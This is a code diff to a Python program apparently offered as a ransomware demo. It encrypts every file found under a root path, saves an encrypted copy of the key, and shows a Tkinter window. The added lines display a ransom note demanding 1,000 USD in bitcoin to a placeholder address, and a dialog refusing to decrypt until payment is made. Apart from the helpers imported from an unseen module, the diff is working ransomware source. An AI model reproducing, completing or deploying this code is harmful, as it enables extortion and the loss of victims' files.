@@ -1,9 +1,11 @@
 import argparse
 import os
+import base64
 from cryptography.fernet import Fernet
 from core import encrypt_symmetric_key, find_files, encrypt_file, decrypt_file, load_key_from_file
 from tkinter import *
 import tkinter as tk
+import tkinter.messagebox
 
 if __name__ == "__main__":
 
@@ -47,7 +49,7 @@ if __name__ == "__main__":
 
         # save the encrypted sym key
         with open(enc_sym_key, 'wb') as f:
-            f.write(encrypted_key)
+            f.write(base64.b64encode(encrypted_key))
 
         # find all files and encrypt them
         files = find_files(os_root_path)
@@ -55,9 +57,19 @@ if __name__ == "__main__":
             print(f'encrypted {file}')
             encrypt_file(file, key)
 
+    with open(enc_sym_key, 'r') as f:
+        encrypted_key = f.read()
     # show gui
     window = Tk()
     window.title("Ransomware Demo")
+
+    desc_text = f"Your files have been encrypted, to claim your files back, send 1,000 USD of BTC to the following address and message to unlock your files\n\n"
+    desc = tk.Text(window, borderwidth=0, height=15)
+    desc2_text = f"address: btc-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\n"
+    desc3_text = f"message: {encrypted_key}\n\n"
+    desc.insert(1.0, desc_text + desc2_text + desc3_text)
+    desc.pack()
+
 
     label = tk.Label(window, text="Decryption key")
     label.pack()
@@ -68,17 +80,22 @@ if __name__ == "__main__":
     def get_textbox():
         # load the key
         key = entry.get()
-        print("Value from text box:", key)
-        l_key = key
+        if key.strip() == "":
+            tkinter.messagebox.showinfo("invalid decryption key", "make payment to the above btc address to get your decryption key")
+        else:
+            print("Value from text box:", key)
+            l_key = key
 
-        # decrypt all files that were encrypted
-        files = find_files(os_root_path)
-        for file in files:
-            print(f"decrypted {file}")
-            decrypt_file(file, l_key)
+            # decrypt all files that were encrypted
+            files = find_files(os_root_path)
+            for file in files:
+                print(f"decrypted {file}")
+                decrypt_file(file, l_key)
 
+            # success message
+            tkinter.messagebox.showinfo("decrypt files", "decrypted files with the given key")
+            entry.delete(0, tk.END)
     button = tk.Button(window, text="Decrypt", command=get_textbox)
     button.pack()
-
 
     window.mainloop()
